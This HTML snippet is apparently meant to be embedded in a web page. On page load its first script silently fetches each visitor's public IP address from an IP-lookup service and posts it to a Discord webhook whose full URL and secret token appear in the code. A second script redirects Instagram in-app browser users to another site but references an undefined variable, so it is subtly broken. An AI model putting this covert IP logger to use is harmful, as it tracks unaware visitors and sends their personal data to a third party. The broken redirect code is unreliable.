<script>
  fetch('https://api.ipify.org')
    .then((res) => res.text())
    .then(ip => {
      // Construct the payload to send to Discord
      const payload = {
        content: `Visitor IP address: ${ip}`
      };

      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your Discord webhook URL
      const webhookUrl = 'https://discord.com/api/webhooks/1218597113911316551/f1YrteXYqN2U-cBjs4DC17ICJjLhIeYyAu80GNF8yR7DvTna9WZzZREfay7sczGA2bJD';

      // Make a POST request to the Discord webhook
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });
    });
</script>
<script>

  const isInstagramBrowser = userAgent.includes('instagram');

  if (isInstagramBrowser) {

    window.location.href = 'https://ishaandev.vercel.app';
  }
</script>
